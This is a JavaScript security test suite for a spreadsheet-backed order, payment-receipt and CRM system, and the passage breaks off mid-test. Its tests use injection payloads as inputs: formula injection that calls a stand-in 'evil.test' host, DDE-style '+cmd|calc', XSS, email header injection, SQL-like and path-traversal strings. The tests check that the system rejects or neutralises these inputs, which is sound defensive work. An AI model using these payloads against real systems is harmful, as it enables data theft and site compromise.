/* Pruebas de seguridad y de flujo del sistema de pedidos (apps-script/) en un simulador.
   Correr:  node pruebas/seguridad.test.js
   Cada prueba imprime ✓ o ✗. Termina con código 1 si alguna falla. */
const { cargar } = require('./simulador');

let fallas = 0, n = 0;
function prueba(nombre, fn) {
  n++;
  try { fn(); console.log('✓', nombre); } catch (e) { fallas++; console.log('✗', nombre, '\n   ', e.message); }
}
const ok = (c, msg) => { if (!c) throw new Error(msg || 'falló'); };
const formulas = filas => filas.flatMap(f => Object.entries(f).filter(([, v]) => v && typeof v === 'object' && 'FORMULA' in v).map(([k, v]) => `${k}=${v.FORMULA}`));

const bytes = (cab, resto = 'foto') => Buffer.concat([Buffer.from(cab), Buffer.from(resto)]).toString('base64');
const JPG = 'data:image/jpeg;base64,' + bytes([0xFF, 0xD8, 0xFF, 0xE0]);
function pedido(sim, extra = {}) {
  return {
    token: sim.config('Token del sitio'), fillMs: 9000, website: '',
    customer: { name: 'Ana López', phone: '9876 5432', email: 'ana@correo.com', city: 'Tegucigalpa', date: '2026-11-20', notes: 'Fondo rosa' },
    items: [{ product: 'Cuadro con minifiguras', qty: 1, unitPrice: 750, discount: 0, total: 750, options: [['Marco', 'Blanco']], bom: [{ key: 'Figura · Cuerpo', qty: 2 }], preview: JPG }],
    total: 750, currency: 'HNL', comprobante: JPG, ...extra,
  };
}
const nuevo = (o = {}) => cargar({ silencio: true, ...o });
// tienda que deja pagar después (para probar el comprobante subido en Mis pedidos)
const sinAnticipo = () => { const s = nuevo(); s.run(`setConfig_('Anticipo antes de enviar', 'No')`); return s; };

// ---------- entrada de pedidos ----------
prueba('Pedido normal se guarda con ID y foto', () => {
  const s = nuevo(); const r = s.post(pedido(s));
  ok(r.ok && /^PEHN-\d{6}-001$/.test(r.id), JSON.stringify(r));
  const p = s.hoja('Pedidos'); ok(p.length === 1 && p[0].Cliente === 'Ana López');
  ok(s.hoja('Partidas').length === 1);
});

prueba('Token falso se rechaza', () => {
  const s = nuevo(); const r = s.post({ ...pedido(s), token: 'x' });
  ok(!r.ok && /Token/.test(r.error)); ok(s.hoja('Pedidos').length === 0);
});

prueba('Sin token se rechaza (aunque el sitio no tenga token configurado)', () => {
  const s = nuevo(); const b = pedido(s); delete b.token; ok(!s.post(b).ok);
});

prueba('Bot: campo trampa lleno', () => { const s = nuevo(); ok(!s.post(pedido(s, { website: 'http://spam' })).ok); });
prueba('Bot: llenado en menos de 2.5 s', () => { const s = nuevo(); ok(!s.post(pedido(s, { fillMs: 300 })).ok); });
prueba('Bot: sin tiempo de llenado', () => { const s = nuevo(); const b = pedido(s); delete b.fillMs; ok(!s.post(b).ok); });

prueba('JSON roto o no-objeto no truena', () => {
  const s = nuevo();
  ['{', 'null', '[]', '"hola"', '12'].forEach(b => ok(!s.post(b).ok, b));
});

prueba('Inyección de fórmulas: ningún texto del cliente queda como fórmula', () => {
  const s = nuevo();
  const malo = '=IMPORTXML("https://evil.test/?x="&A1;"//a")';
  const b = pedido(s, {
    customer: { name: malo, phone: '+504 9876-5432', email: 'a@b.co', city: '@SUM(A1)', date: '-1+1', notes: '+cmd|calc' },
    items: [{ product: '=HYPERLINK("http://evil")', qty: 1, total: 10, options: [['=1+1', '-2'], '@x'], bom: [{ key: '=A1', qty: 1 }] }],
  });
  ok(s.post(b).ok);
  ['Pedidos', 'Partidas', 'Clientes', 'Recetas'].forEach(h => { const f = formulas(s.hoja(h)); ok(!f.length, h + ': ' + f.join(' | ')); });
  ok(s.hoja('Pedidos')[0].Cliente.texto === malo, 'el texto se guarda tal cual, como texto');
});

prueba('Textos gigantes se recortan', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { customer: { name: 'A'.repeat(5000), phone: '98765432', city: 'B'.repeat(5000), notes: 'C'.repeat(50000) } })).ok);
  const p = s.hoja('Pedidos')[0];
  ok(p.Cliente.length <= 80 && p.Ciudad.length <= 60 && p['Notas del cliente'].length <= 1000);
  ok(p.Datos.length < 50000, 'Datos cabe en una celda');
});

prueba('Saltos de línea en el nombre no llegan al asunto del correo', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { customer: { name: 'Ana\r\nBcc: todos@x.com', phone: '98765432', city: 'X' } })).ok);
  ok(s.mails.every(m => !/[\r\n]/.test(m.subject)), s.mails.map(m => m.subject).join(' / '));
});

prueba('HTML en el nombre no se inyecta en el correo', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { customer: { name: '<img src=x onerror=alert(1)>', phone: '98765432', city: 'X', email: 'a@b.co' } })).ok);
  ok(s.mails.every(m => !/<img src=x/.test(m.htmlBody)));
});

prueba('Cantidades y montos absurdos se acotan', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { total: -500, items: [{ product: 'X', qty: 1e9, total: 'abc', options: 'no-es-lista' }] })).ok);
  const pa = s.hoja('Partidas')[0], pe = s.hoja('Pedidos')[0];
  ok(pa.Cantidad === 99 && pa.Total === 0 && pe.Total === 0, JSON.stringify([pa.Cantidad, pa.Total, pe.Total]));
});

prueba('SVG o tipos raros no se guardan como imagen', () => {
  const s = nuevo();
  const svg = 'data:image/svg+xml;base64,' + Buffer.from('<svg onload=alert(1)>').toString('base64');
  ok(s.post(pedido(s, { items: [{ product: 'X', qty: 1, total: 1, preview: svg, images: [svg, 'javascript:alert(1)'] }] })).ok);
  ok(!s.hoja('Partidas')[0]['Imágenes del cliente'], 'no debe guardar archivos');
});

prueba('Teléfono inválido o correo inválido', () => {
  const s = nuevo();
  ok(!s.post(pedido(s, { customer: { name: 'A', phone: '123', city: 'X' } })).ok);
  ok(!s.post(pedido(s, { customer: { name: 'A', phone: '98765432', city: 'X', email: 'no-es-correo' } })).ok);
});

prueba('Límite por WhatsApp: el 6.º pedido en 10 min se frena', () => {
  const s = nuevo();
  for (let i = 0; i < 5; i++) ok(s.post(pedido(s)).ok, 'pedido ' + (i + 1));
  ok(!s.post(pedido(s)).ok);
});

prueba('Límite global por hora frena inundación con números distintos', () => {
  const s = nuevo();
  let rech = 0;
  for (let i = 0; i < 50; i++) if (!s.post(pedido(s, { customer: { name: 'Bot', phone: '9' + String(1000000 + i), city: 'X' } })).ok) rech++;
  ok(rech === 10, 'rechazados ' + rech);
});

prueba('IDs no se repiten aunque se borre una fila', () => {
  const s = nuevo();
  s.post(pedido(s)); s.post(pedido(s, { customer: { name: 'B', phone: '99998888', city: 'X' } }));
  const sh = s.ctx.SpreadsheetApp.getActive().getSheetByName('Pedidos');
  sh._g.splice(1, 1); // borra el primer pedido
  const r = s.post(pedido(s, { customer: { name: 'C', phone: '97776666', city: 'X' } }));
  ok(r.id.endsWith('-003'), r.id);
});

// ---------- anticipo antes de enviar ----------
prueba('Sin comprobante no se puede enviar el pedido', () => {
  const s = nuevo(); const r = s.post(pedido(s, { comprobante: '' }));
  ok(!r.ok && /comprobante/.test(r.error), r.error); ok(s.hoja('Pedidos').length === 0);
});

prueba('Comprobante junto con el pedido: queda en Pagos y cuenta como pagado', () => {
  const s = nuevo(); s.ctx.__ocr = 'Transferencia L 375.00';
  const r = s.post(pedido(s));
  ok(r.ok && r.pago && r.pago.resultado === 'Coincide', JSON.stringify(r));
  const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id: r.id, phone: '98765432' });
  ok(seg.pedido.pagado === 375 && seg.pedido.porPagarAnticipo === 0);
});

prueba('Comprobante inválido no crea el pedido', () => {
  const s = nuevo(); const html = 'data:text/html;base64,' + Buffer.from('<script>').toString('base64');
  ok(!s.post(pedido(s, { comprobante: html })).ok); ok(s.hoja('Pedidos').length === 0);
});

prueba('Con "Anticipo antes de enviar = No" se puede pedir sin comprobante', () => {
  const s = nuevo(); s.run(`setConfig_('Anticipo antes de enviar', 'No')`);
  ok(s.post(pedido(s, { comprobante: '' })).ok);
});

prueba('Mis pedidos: solo devuelve los que coinciden con su WhatsApp', () => {
  const s = nuevo(); const t = s.config('Token del sitio');
  const a = s.post(pedido(s)).id, b = s.post(pedido(s, { customer: { name: 'Otro', phone: '91112222', city: 'X' } })).id;
  const r = s.post({ token: t, accion: 'misPedidos', pedidos: [{ id: a, phone: '98765432' }, { id: b, phone: '98765432' }, { id: 'PEHN-x', phone: '1' }] });
  ok(r.ok && r.pedidos.length === 1 && r.pedidos[0].id === a, JSON.stringify(r));
});

prueba('API del sitio entrega datos de pago para el carrito', () => {
  const s = nuevo(); s.run(`setConfig_('Datos bancarios', 'BAC 123')`);
  const r = s.get({ api: 'sitio' }); ok(r.pago && r.pago.pct === 50 && r.pago.banco === 'BAC 123' && r.pago.antes === true, JSON.stringify(r.pago));
});

// ---------- Mi pedido (seguimiento) ----------
prueba('Seguimiento con WhatsApp correcto devuelve solo estado y montos', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  const r = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '+504 9876-5432' });
  ok(r.ok, r.error);
  ok(r.pedido.anticipo === 375 && r.pedido.total === 750);
  const txt = JSON.stringify(r);
  ['Ana', 'ana@correo', 'Tegucigalpa', 'Fondo rosa'].forEach(x => ok(!txt.includes(x), 'filtra ' + x));
});

prueba('Seguimiento con WhatsApp ajeno da el mismo error que un pedido inexistente', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  const a = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '91112222' });
  const b = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id: 'PEHN-000000-999', phone: '98765432' });
  ok(!a.ok && !b.ok && a.error === b.error, a.error + ' / ' + b.error);
});

prueba('Seguimiento: adivinar a fuerza bruta se frena', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  let ultimo;
  for (let i = 0; i < 20; i++) ultimo = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '9' + String(1000000 + i) });
  ok(/intentos/.test(ultimo.error), ultimo.error);
});

prueba('Seguimiento: ID con caracteres raros se rechaza', () => {
  const s = nuevo();
  ["' OR 1=1 --", 'PEHN-"><script>', '../../etc', 'PEHN-*'].forEach(id => ok(!s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' }).ok, id));
});

// ---------- comprobantes ----------
prueba('Comprobante con monto correcto: "Coincide"', () => {
  const s = sinAnticipo(); const { id } = s.post(pedido(s, { comprobante: '' }));
  s.ctx.__ocr = 'BAC Credomatic\nTransferencia exitosa\n27/10/2026 14:22\nCuenta 1234 5678\nMonto: L 375.00\nReferencia 99812';
  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(r.ok && r.pago.resultado === 'Coincide' && r.pago.monto === 375, JSON.stringify(r));
  const pg = s.hoja('Pagos'); ok(pg.length === 1 && pg[0].Resultado === 'Coincide');
  const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
  ok(seg.pedido.pagado === 375 && seg.pedido.porPagarAnticipo === 0 && seg.pedido.saldo === 375, JSON.stringify(seg.pedido));
});

prueba('Comprobante con otro monto: queda en revisión y no cuenta como pagado', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  s.ctx.__ocr = 'Pago realizado HNL 1,200.00';
  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(r.ok && r.pago.resultado === 'Revisión' && r.pago.monto === 1200, JSON.stringify(r));
  const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
  ok(seg.pedido.pagado === 0);
});

prueba('Comprobante sin Drive API: se guarda y queda "Sin lectura"', () => {
  const s = nuevo({ ocr: false }); const { id } = s.post(pedido(s));
  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(r.ok && s.hoja('Pagos')[0].Resultado === 'Sin lectura');
});

prueba('Comprobante de pedido ajeno se rechaza', () => {
  const s = sinAnticipo(); const { id } = s.post(pedido(s, { comprobante: '' }));
  ok(!s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '91112222', file: JPG }).ok);
  ok(s.hoja('Pagos').length === 0);
});

prueba('Comprobante que no es imagen ni PDF se rechaza', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  const html = 'data:text/html;base64,' + Buffer.from('<script>').toString('base64');
  ok(!s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: html }).ok);
});

prueba('Texto del OCR con fórmulas no se vuelve fórmula', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  s.ctx.__ocr = '=IMPORTDATA("http://evil") L 375';
  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(!formulas(s.hoja('Pagos')).length);
});

prueba('Lectura de montos en formatos comunes', () => {
  const s = nuevo(), { montosEn_, elegirMonto_ } = s.x;
  const casos = [['Monto L 1,250.00', 1250, 1250], ['Lps. 625', 625, 625], ['HNL 1.250,50', 1250.5, 1250.5], ['Total: 375.00 fecha 27/10/2026', 375, 375], ['sin numeros', null, 100]];
  casos.forEach(([t, esperado, esp]) => { const m = elegirMonto_(montosEn_(t), esp); ok(m === esperado, `${t} -> ${m}`); });
});

// ---------- CRM ----------
prueba('CRM sin clave: sin acceso', () => {
  const s = nuevo();
  let err = ''; try { s.run('crm("mala", "datos", {})'); } catch (e) { err = e.message; }
  ok(/Sin acceso/.test(err), err);
});

prueba('CRM: no deja escribir en la fila de encabezados ni fuera de rango', () => {
  const s = nuevo(); s.post(pedido(s)); const k = s.config('Clave del CRM');
  [1, 0, -1, 999, '2; DROP', 2.5].forEach(row => {
    let err = ''; try { s.run(`crm(${JSON.stringify(k)}, "nota", ${JSON.stringify({ row, texto: 'x' })})`); } catch (e) { err = e.message; }
    ok(/Fila inválida/.test(err), 'fila ' + row + ': ' + err);
  });
  ok(s.hoja('Pedidos').length === 1);
});

prueba('CRM: notas y etiquetas con fórmulas quedan como texto', () => {
  const s = nuevo(); s.post(pedido(s)); const k = JSON.stringify(s.config('Clave del CRM'));
  s.run(`crm(${k}, "nota", { row: 2, texto: '=1+1' })`);
  s.run(`crm(${k}, "cliente", { row: 0, tel: '50433334444', nombre: '=X', etiquetas: '+vip', notas: '@a' })`);
  s.run(`crm(${k}, "pieza", { sku: 'nuevo', pieza: '=HYPERLINK(1)', stock: 3 })`);
  ['Pedidos', 'Clientes', 'Inventario', 'Movimientos'].forEach(h => ok(!formulas(s.hoja(h)).length, h + ': ' + formulas(s.hoja(h))));
});

prueba('CRM: confirmar un pago lo suma como pagado', () => {
  const s = nuevo(); const { id } = s.post(pedido(s)); const k = JSON.stringify(s.config('Clave del CRM'));
  s.ctx.__ocr = 'algo raro';
  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  s.run(`crm(${k}, "pago", { row: 2, resultado: 'Confirmado', monto: 375 })`);
  const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
  ok(seg.pedido.pagado === 375, JSON.stringify(seg.pedido));
  let err = ''; try { s.run(`crm(${k}, "pago", { row: 2, resultado: 'Hackeado' })`); } catch (e) { err = e.message; }
  ok(/inválido/.test(err));
});

// ---------- contenido del sitio ----------
prueba('API pública del sitio solo entrega textos y colores, nunca pedidos', () => {
  const s = nuevo(); s.post(pedido(s));
  const r = s.get({ api: 'sitio' });
  ok(r.ok && r.sitio['color.marca'] === '#F08A1C' && r.sitio['hero.titulo'], JSON.stringify(r).slice(0, 200));
  const t = JSON.stringify(r); ['Ana', 'ana@correo', '98765432', 'Token', 'Clave'].forEach(x => ok(!t.includes(x), 'filtra ' + x));
});

prueba('Sin clave, ?k= vacío no abre el CRM', () => {
  const s = nuevo(); const h = s.ctx.doGet({ parameter: {} }).getContent(); ok(/no tiene acceso/.test(h));
});

prueba('Guardar sitio: valida colores, enlaces, fotos y WhatsApp', () => {
  const s = nuevo(); const k = JSON.stringify(s.config('Clave del CRM'));
  s.run(`crm(${k}, "sitio", { cambios: [{ clave: 'color.marca', valor: '#112233' }, { clave: 'hero.titulo', valor: '<script>alert(1)</script>' }, { clave: 'contacto.whatsapp', valor: '+504 9876-5432' }] })`);
  const r = s.get({ api: 'sitio' }).sitio;
  ok(r['color.marca'] === '#112233' && r['contacto.whatsapp'] === '50498765432');
  ok(r['hero.titulo'] === '<script>alert(1)</script>', 'el texto se guarda tal cual; el sitio lo pinta como texto, no como HTML');
  [['color.marca', 'red;background:url(x)'], ['hero.foto', 'javascript:alert(1)'], ['hero.foto', 'https://evil.com/x.jpg'], ['contacto.instagram', 'javascript:alert(1)'], ['contacto.whatsapp', '12'], ['no.existe', 'x']].forEach(([clave, valor]) => {
    let err = ''; try { s.run(`crm(${k}, "sitio", { cambios: [${JSON.stringify({ clave, valor })}] })`); } catch (e) { err = e.message; }
    ok(/No se guardaron/.test(err), clave + ' = ' + valor + ' debió rechazarse');
  });
  ok(s.get({ api: 'sitio' }).sitio['color.marca'] === '#112233', 'lo inválido no pisó lo bueno');
});

prueba('Texto del sitio con fórmula queda como texto en la hoja', () => {
  const s = nuevo(); const k = JSON.stringify(s.config('Clave del CRM'));
  s.run(`crm(${k}, "sitio", { cambios: [{ clave: 'anuncio', valor: '=IMPORTXML("http://x";"//a")' }] })`);
  ok(!formulas(s.hoja('Sitio')).length);
});

// ---------- correos: 1 al cliente por pedido, 1 resumen al día para el negocio ----------
const NEG = 'duenos@pehn.test';
const soloTexto = m => String(m.htmlBody).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ');

prueba('Un pedido manda exactamente 1 correo (al cliente) y 0 al negocio', () => {
  const s = nuevo(); ok(s.post(pedido(s)).ok);
  ok(s.mails.length === 1, 'correos: ' + s.mails.length);
  ok(s.mails[0].to === 'ana@correo.com' && s.mails.every(m => m.to !== NEG));
  ok(s.hoja('Pedidos')[0]['Correo cliente'] === 'Enviado');
});

prueba('Comprobante en Mis pedidos ya no avisa al negocio', () => {
  const s = sinAnticipo(); const { id } = s.post(pedido(s, { comprobante: '' })); s.mails.length = 0;
  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(s.mails.length === 0, 'correos: ' + s.mails.length);
});

prueba('Correo al cliente: ID, total y anticipo 50% con saldo (comprobante que coincide)', () => {
  const s = nuevo(); s.ctx.__ocr = 'Monto L 375.00';
  s.run(`setConfig_('Sitio web', 'https://pehn.test/')`);
  const { id } = s.post(pedido(s)); const m = s.mails[0], t = soloTexto(m);
  ok(m.subject.includes(id) && t.includes(id), 'lleva el ID');
  ok(/Recibimos tu anticipo de L\s?375/.test(t) && /50%/.test(t) && /Falta L\s?375/.test(t), t);
  ok(m.htmlBody.includes(`https://pehn.test/pedido.html?id=${id}`), 'enlace a Mis pedidos');
});

prueba('Correo al cliente: comprobante por revisar dice "verificando"', () => {
  const s = nuevo(); s.ctx.__ocr = 'Monto L 900.00'; s.post(pedido(s));
  ok(/Estamos verificando tu anticipo de L\s?375/.test(soloTexto(s.mails[0])), soloTexto(s.mails[0]));
});

prueba('Correo al cliente: sin anticipo pide el 50% con datos bancarios', () => {
  const s = sinAnticipo(); s.run(`setConfig_('Datos bancarios', 'BAC 123456')`);
  s.post(pedido(s, { comprobante: '' })); const t = soloTexto(s.mails[0]);
  ok(/Para empezar paga el 50%\s*\(\s*L\s?375/.test(t) && t.includes('BAC 123456'), t);
});

prueba('Sin cuota de correo: el pedido se guarda y queda "Sin correo"', () => {
  const s = nuevo(); s.estado.cuota = 1; // 1 = la reserva del resumen
  const r = s.post(pedido(s)); ok(r.ok, r.error);
  ok(s.mails.length === 0);
  ok(/^Sin correo/.test(s.hoja('Pedidos')[0]['Correo cliente']), s.hoja('Pedidos')[0]['Correo cliente']);
});

prueba('Si el envío falla, el pedido se guarda con "Falló: motivo"', () => {
  const s = nuevo(); s.estado.falla = 'Service invoked too many times';
  const r = s.post(pedido(s)); ok(r.ok, r.error);
  ok(/^Falló: Service invoked/.test(s.hoja('Pedidos')[0]['Correo cliente']), s.hoja('Pedidos')[0]['Correo cliente']);
});

prueba('Pedido sin correo del cliente: marca "Sin correo" y no envía nada', () => {
  const s = nuevo(); s.post(pedido(s, { customer: { name: 'Sin Mail', phone: '98765432', city: 'X' } }));
  ok(s.mails.length === 0 && s.hoja('Pedidos')[0]['Correo cliente'] === 'Sin correo');
});

prueba('resumenDiario_ manda 1 correo al negocio con los pedidos del día', () => {
  const s = nuevo(); s.ctx.__ocr = 'Monto L 375.00';
  const a = s.post(pedido(s)).id, b = s.post(pedido(s, { customer: { name: 'Beto Pérez', phone: '91112222', email: 'b@b.co', city: 'SPS', date: '2026-10-28' } })).id;
  s.estado.cuota = 1; s.post(pedido(s, { customer: { name: 'Carla Sin Cuota', phone: '93334444', email: 'c@c.co', city: 'X' } }));
  s.estado.cuota = 100; s.mails.length = 0;
  s.run('resumenDiario_()');
  ok(s.mails.length === 1 && s.mails[0].to === NEG, 'correos: ' + s.mails.length);
  const t = soloTexto(s.mails[0]);
  ok(t.includes(a) && t.includes(b) && t.includes('Beto Pérez') && t.includes('SPS'), t);
  ok(/vendido hoy/.test(t) && /Correos al cliente que no salieron/.test(t) && t.includes('Carla Sin Cuota'), 'vendido y correos fallidos');
  ok(/Pedidos activos por estado/.test(t) && /Inventario/.test(t), 'estados e inventario');
});

prueba('resumenDiario_ sin pedidos: correo corto "Sin pedidos hoy" con inventario', () => {
  const s = nuevo(); s.run('resumenDiario_()');
  ok(s.mails.length === 1 && /^Sin pedidos hoy/.test(s.mails[0].subject), s.mails.map(m => m.subject).join('|'));
  ok(/Inventario/.test(soloTexto(s.mails[0])));
});

prueba('resumenDiario_ respeta "Resumen diario al negocio = No" y el ajuste viejo', () => {
  const s = nuevo(); s.run(`setConfig_('Resumen diario al negocio', 'No')`); s.run('resumenDiario_()'); ok(s.mails.length === 0);
  const v = nuevo(); v.run(`rows_('config').forEach(r => { if (r.Ajuste === 'Resumen diario al negocio') sheet_('config').getRange(r._row, 1).setValue('Aviso de stock bajo'); })`);
  v.run(`setConfig_('Aviso de stock bajo', 'No')`); v.run('resumenDiario_()'); ok(v.mails.length === 0, 'respeta la fila vieja');
});

prueba('Configurar hojas deja el resumen a la hora de Config y sin resumenStockDiario_', () => {
  const s = nuevo();
  const res = () => s.triggers.filter(t => t.fn === 'resumenDiario_');
  ok(res().length === 1 && res()[0].hora === 20, JSON.stringify(res()));
  s.triggers.push({ fn: 'resumenStockDiario_', hora: 8 }); // disparador viejo
  s.run(`setConfig_('Hora del resumen diario', 18)`);
  s.ctx.Session.getActiveUser = () => ({ getEmail: () => NEG }); s.run('configurar()');
  ok(res().length === 1 && res()[0].hora === 18, JSON.stringify(res()));
  ok(!s.triggers.some(t => t.fn === 'resumenStockDiario_'), 'sigue el viejo');
  ok(s.triggers.filter(t => t.fn === 'alEditar_').length === 1 && s.triggers.some(t => t.fn === 'respaldoSemanal_'));
});

prueba('Cambiar la hora en Config (al editar) rehace el disparador', () => {
  const s = nuevo();
  s.run(`setConfig_('Hora del resumen diario', 7)`);
  s.run(`alEditar_({ value: '7', range: sheet_('config').getRange(rows_('config').find(r => r.Ajuste === 'Hora del resumen diario')._row, 2) })`);
  const t = s.triggers.filter(x => x.fn === 'resumenDiario_'); ok(t.length === 1 && t[0].hora === 7, JSON.stringify(t));
  ['', 'abc', 99, -3].forEach(v => { s.run(`setConfig_('Hora del resumen diario', ${JSON.stringify(v)})`); const h = s.run('horaResumen_()'); ok(h >= 0 && h <= 23, v + ' -> ' + h); });
});

prueba('Instalación vieja: "Aviso de stock bajo" migra a "Resumen diario al negocio"', () => {
  const s = nuevo();
  s.run(`rows_('config').forEach(r => { if (r.Ajuste === 'Resumen diario al negocio') sheet_('config').getRange(r._row, 1).setValue('Aviso de stock bajo'); })`);
  s.run(`setConfig_('Aviso de stock bajo', 'No')`);
  s.ctx.Session.getActiveUser = () => ({ getEmail: () => NEG }); s.run('configurar()');
  ok(s.config('Resumen diario al negocio') === 'No', String(s.config('Resumen diario al negocio')));
  ok(s.hoja('Config').filter(r => r.Ajuste === 'Resumen diario al negocio').length === 1, 'sin duplicar');
});

prueba('Revisión del sistema corre sin romperse', () => {
  const s = nuevo(); const t = s.run('revisarSistema()'); ok(/Hoja Pedidos/.test(t), t);
});

// ---------- CRM: XSS y clave (CN-001, CN-002, CN-003) ----------
const fsx = require('fs'), pathx = require('path');
const leerGs = f => fsx.readFileSync(pathx.join(__dirname, '..', 'apps-script', f), 'utf8');
const crmHtml = (s, k) => s.run(`crmHtml_(${JSON.stringify(k)})`).getContent();
const lineaDe = (html, ini) => html.split('\n').find(l => l.startsWith(ini));

prueba('CRM: ?k= con basura no se refleja; K sale vacío y escapado', () => {
  const s = nuevo({ usuario: 'duenos@pehn.test' });
  const html = crmHtml(s, '"</script><script>alert(1)</script>');
  ok(lineaDe(html, 'const K = ') === 'const K = "";', lineaDe(html, 'const K = '));
  ok(!html.includes('alert(1)'), 'la basura llegó a la página');
});

prueba('CRM: con la clave verdadera K la lleva; sin ella (Admin por correo) crm() funciona', () => {
  const s = nuevo({ usuario: 'duenos@pehn.test' });
  const k = s.run('clave_()');
  ok(lineaDe(crmHtml(s, k), 'const K = ') === `const K = "${k}";`);
  ok(JSON.parse(s.run(`crm('', 'datos')`)).pedidos, 'Admin por correo con K vacío');
  const ext = nuevo({ usuario: '' }); // desconocido: sin clave no entra
  let negado = false; try { ext.run(`crm('', 'datos')`); } catch (e) { negado = true; }
  ok(negado, 'sin clave ni correo debe negarse');
});

prueba('CRM: datos con <!--<script> y </script> no rompen el bloque de datos', () => {
  const s = nuevo({ usuario: 'duenos@pehn.test' });
  const malo = '<!--<script> </script><script>alert(1)</script>';
  ok(s.post(pedido(s, { customer: { name: malo, phone: '9876 5432', email: 'a@b.co', city: malo, date: '', notes: malo } })).ok);
  const html = crmHtml(s, '');
  const ini = html.indexOf('let D = '), fin = html.indexOf('\nconst ERROR', ini);
  const bloque = html.slice(ini, fin);
  ok(bloque.length > 100 && fin > ini, 'no se halló el bloque');
  ok(!bloque.includes('<'), 'queda un "<" dentro del bloque de datos');
  ok(JSON.parse(bloque.slice(8).replace(/;\s*$/, '')).pedidos[0].cliente.startsWith('<!--<script>'), 'el texto no se conserva');
});

prueba('Clave del CRM: comparación en tiempo constante', () => {
  const s = nuevo();
  ok(s.run(`iguales_('abc123', 'abc123')`) === true);
  ['abc124', 'abc12', 'abc1234', '', 'ABC123'].forEach(x => ok(s.run(`iguales_('abc123', ${JSON.stringify(x)})`) === false, x));
  ok(!/===\s*clave_\(\)|clave_\(\)\s*===/.test(leerGs('Admin.gs')), 'queda un === con la clave');
});

prueba('Clave del CRM: intento fallido deja aviso sin la clave; sin clave no avisa', () => {
  const s = nuevo(); const avisos = [];
  s.ctx.console.warn = (...a) => avisos.push(a.join(' '));
  ok(s.run(`autorizado_('mala-clave')`) === false);
  ok(avisos.length === 1 && !avisos[0].includes('mala-clave'), JSON.stringify(avisos));
  s.run(`autorizado_('')`); ok(avisos.length === 1, 'avisó sin clave');
});

prueba('Clave del CRM: Pehn › Cambiar clave genera una nueva de 32 y la vieja deja de servir', () => {
  const s = nuevo({ usuario: 'duenos@pehn.test' });
  const vieja = s.run('clave_()');
  const nueva = s.run('rotarClave_()');
  ok(/^[0-9a-f]{32}$/.test(nueva) && nueva !== vieja, nueva);
  ok(s.config('Clave del CRM') === nueva && s.run('clave_()') === nueva);
  s.ctx.Session.getActiveUser = () => ({ getEmail: () => '' }); // ya no es el dueño: solo cuenta la clave
  ok(s.run(`autorizado_(${JSON.stringify(vieja)})`) === false, 'la vieja sigue sirviendo');
  ok(s.run(`autorizado_(${JSON.stringify(nueva)})`) === true);
  ok(/Cambiar clave del CRM/.test(leerGs('Setup.gs')), 'falta el menú');
});

prueba('Resumen diario: el correo ya no lleva la clave del CRM', () => {
  const s = nuevo();
  s.post(pedido(s));
  s.mails.length = 0; s.run('resumenDiario_()');
  const m = s.mails.find(x => /Resumen de hoy/.test(x.subject)); ok(m, 'no salió el resumen: ' + JSON.stringify(s.mails.map(x => x.subject)));
  ok(!/k=/.test(m.htmlBody) && !m.htmlBody.includes(s.run('clave_()')), 'lleva la clave');
  ok(/Abrir la hoja/.test(m.htmlBody) && /Abrir CRM/.test(m.htmlBody));
});

// ---------- Abuso del token público (CN-004) y errores (CN-007) ----------
const PNG = 'data:image/png;base64,' + bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A]);
const WEBP = 'data:image/webp;base64,' + bytes('RIFF\u0000\u0000\u0000\u0000WEBPVP8 ');
const PDF = 'data:application/pdf;base64,' + bytes('%PDF-1.4');
const conCliente = (extra = {}) => ({ customer: { name: 'Ana López', phone: '9876 5432', email: 'ana@correo.com', city: 'Tegucigalpa', date: '', notes: '', ...extra } });

prueba('Correo: el 2.º pedido al mismo correo el mismo día no manda otro correo', () => {
  const s = nuevo();
  ok(s.post(pedido(s)).ok); ok(s.post(pedido(s, conCliente({ email: 'ANA@Correo.com' }))).ok);
  const p = s.hoja('Pedidos');
  ok(p[0]['Correo cliente'] === 'Enviado', p[0]['Correo cliente']);
  ok(p[1]['Correo cliente'] === 'Sin correo (ya se le escribió hoy)', p[1]['Correo cliente']);
  ok(s.mails.length === 1, 'salieron ' + s.mails.length);
  ok(![...s.cache.keys()].some(k => /ana|correo/i.test(k)), 'el correo quedó en la caché sin hash');
  ok(s.post(pedido(s, conCliente({ email: 'otra@correo.com' }))).ok && s.mails.length === 2, 'otro destinatario sí recibe');
});

prueba('Correo: el resumen diario avisa de los correos que no salieron por límite diario', () => {
  const s = nuevo(); s.post(pedido(s)); s.post(pedido(s));
  s.mails.length = 0; s.run('resumenDiario_()');
